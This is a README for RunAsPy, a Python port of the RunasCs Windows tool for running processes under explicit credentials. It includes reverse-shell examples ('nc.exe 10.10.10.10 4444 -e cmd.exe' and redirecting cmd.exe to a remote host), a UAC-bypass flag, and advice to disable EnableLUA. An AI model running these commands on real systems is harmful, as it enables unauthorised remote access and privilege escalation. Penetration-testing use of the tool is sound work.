# RunAsPy

A python port of [RunAsCs](https://github.com/antonioCoco/RunasCs)

*RunasPy* is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.
This tool is an improved and open version of windows builtin *runas.exe* that solves some limitations:

* Allows explicit credentials
* Works both if spawned from interactive process and from service process
* Manage properly *DACL* for *Window Stations* and *Desktop* for the creation of the new process
* Uses more reliable create process functions like ``CreateProcessAsUser()`` and ``CreateProcessWithTokenW()`` if the calling process holds the required privileges (automatic detection)
* Allows to specify the logon type, e.g. 8-NetworkCleartext logon (no *UAC* limitations)
* Allows to bypass UAC when an administrator password is known (flag --bypass-uac)
* Allows to create a process with the main thread impersonating the requested user (flag --remote-impersonation)
* Allows redirecting *stdin*, *stdout* and *stderr* to a remote host
* It's Open Source :)

*RunasPy* has an automatic detection to determine the best create process function for every contexts.
Based on the process caller token permissions, it will use one of the create process function in the following preferred order:

1. ``CreateProcessAsUserW()``
2. ``CreateProcessWithTokenW()``
3. ``CreateProcessWithLogonW()``

## Requirements

----

Python >= 3.8

# Usage

----

## commandline

```console
usage: RunAs.py [-h] [-d [DOMAINNAME]] -u [USERNAME] -P [PASSWORD] -c [CMD ...] [-t [PROCESSTIMEOUT]]
                [-l [{2,3,4,5,8,9}]] [-f [CREATEPROCESSFUNCTION]] [-r [REMOTE]] [-p] [-b] [-i] [-v]

options:
  -h, --help            show this help message and exit
  -d [DOMAINNAME], --domain [DOMAINNAME]
  -u [USERNAME], --username [USERNAME]
  -P [PASSWORD], --password [PASSWORD]
  -c [CMD ...], --command [CMD ...]
  -t [PROCESSTIMEOUT], --timeout [PROCESSTIMEOUT]
  -l [{2,3,4,5,8,9}], --logon-type [{2,3,4,5,8,9}]
  -f [CREATEPROCESSFUNCTION], --function [CREATEPROCESSFUNCTION]
  -r [REMOTE], --remote [REMOTE]
  -p, --force-profile
  -b, --bypass-uac
  -i, --remote-impersonation
  -v, --verbose         increase verbosity
```

### Run a command as a local user

```console
Runas.py -u user1 -P password1 -c "cmd /c whoami /all"
```

### Run a command as a domain user and logon type as NetworkCleartext (8)

```console
Runas.py -u user1 -P password1 -c "cmd /c whoami /all" -d domain -l 8
```

### Run a background process as a local user,
    
```console
Runas.py -u user1 -P password1 -c "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
```

### Redirect stdin, stdout and stderr of the specified command to a remote host
   
```console
Runas.py -u user1 -P password1 -c cmd.exe -r 10.10.10.10:4444
```

### Run a command simulating the /netonly flag of runas.exe

```console
Runas.py -u user1 -P password1 -c "cmd /c whoami /all" -l 9
```

### Run a command as an Administrator bypassing UAC
    
```console
Runas.py -u adm1 -P password1 -c "cmd /c whoami /priv" --bypass-uac
```

### Run a command as an Administrator through remote impersonation

```console
Runas.py -u adm1 -P password1 -c "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```

## programmatic (python module)

```python
import RunAsPy
config = {"username": "foo", "password": "F00", "cmd": "whoami /priv", "verbose":True, bypassUac:True}
output = RunAsPy.Runas(**config)
print(output)
```

The two processes (calling and called) will communicate through one *pipe* (both for *stdout* and *stderr*).
The default logon type is 2 (*Interactive*). 

By default, the *Interactive* (2) logon type is restricted by *UAC* and the generated token from these authentications are filtered.
You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
```

Otherwise, you can try the flag **--bypass-uac** for an attempt in bypassing the token filtering limitation.

**NetworkCleartext (8)** logon type is the one with the widest permissions as it doesn't get filtered by UAC in local tokens and still allows
 authentications over the Network as it stores credentials in the authentication package. If you holds enough privileges, try to always specify this logon type through the flag --logon-type 8.

By default, the calling process (*RunasPy*) will wait until the end of the execution of the spawned process. 
If you need to spawn a background or async process, i.e. spawning a reverse shell, you need to set the parameter ``-t timeout`` to ``0``. In this case *RunasPy* won't wait for the end of the newly spawned process execution.

## Special Thanks

* [antonioCoco](https://github.com/antonioCoco) - for the RunAsCs project
* [natesubra](https://github.com/natesubra) - For the help with the UAC bypass
